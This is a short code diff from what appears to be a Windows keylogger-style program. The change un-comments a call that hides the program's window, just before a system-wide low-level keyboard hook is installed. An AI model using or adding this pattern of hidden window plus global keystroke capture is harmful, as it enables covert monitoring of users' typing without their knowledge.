@@ -48,7 +48,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     MessageBoxExA(NULL, msg, "Error", MB_OK | MB_ICONERROR, 0);
     PostQuitMessage(0);
   }
-  // ShowWindow(hwnd, SW_HIDE);
+  ShowWindow(hwnd, SW_HIDE);
 
   hook_handle = SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)&LowLevelKeyboardProc, NULL, 0);
   try
